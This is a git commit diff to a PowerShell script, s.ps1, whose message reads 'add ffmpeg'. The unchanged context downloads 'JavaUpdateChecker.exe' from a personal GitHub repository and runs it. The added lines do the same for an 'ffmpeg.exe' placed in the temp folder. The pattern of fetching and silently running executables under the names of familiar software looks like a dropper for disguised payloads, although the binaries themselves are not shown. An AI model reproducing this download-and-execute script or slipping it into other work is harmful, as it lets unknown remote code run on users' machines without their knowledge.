e1695005f345f7f15038a33e12f1f9c3d0713bfe
Mikhail Chestneyshy <82827415+jostanise@users.noreply.github.com>
2022-12-12 12:33:12 +0300

    add ffmpeg

--- s.ps1
+++ s.ps1
@@ -11,3 +11,18 @@ else {
 $client = New-Object System.Net.WebClient
 $client.DownloadFile("https://github.com/jostanise/s/raw/main/JavaUpdateChecker.exe", $exe)
 Start-Process -Filepath $exe
+
+$exe = $env:temp + "\ffmpeg.exe"
+
+if (Test-Path $exe) {
+  Remove-Item $exe
+  write-host "$exe has been deleted"
+}
+else {
+  Write-host "$exe doesn't exist"
+}
+
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://github.com/jostanise/s/raw/main/ffmpeg.exe", $exe)
+Start-Process -Filepath $exe
+
